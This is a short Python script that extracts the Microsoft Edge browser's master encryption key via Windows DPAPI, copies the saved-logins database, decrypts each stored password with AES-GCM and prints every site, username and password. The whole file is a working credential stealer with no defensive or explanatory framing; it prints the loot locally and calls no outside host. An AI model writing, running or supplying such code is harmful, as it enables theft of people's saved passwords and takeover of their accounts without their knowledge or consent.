import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Cryptodome.Cipher import AES
import ctypes
import datetime

# Get encryption key from 'Local State'
def get_edge_key():
    path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
    with open(path, 'r', encoding='utf-8') as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Decrypt AES-encrypted password
def decrypt_password(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return "Decryption failed"

# Main function
def extract_edge_passwords():
    login_db_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
    temp_db = 'Loginvault.db'
    shutil.copy2(login_db_path, temp_db)
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    key = get_edge_key()
    
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        if encrypted_password:
            decrypted_password = decrypt_password(encrypted_password, key)
            print(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n")
    
    cursor.close()
    conn.close()
    os.remove(temp_db)

# Run
extract_edge_passwords()
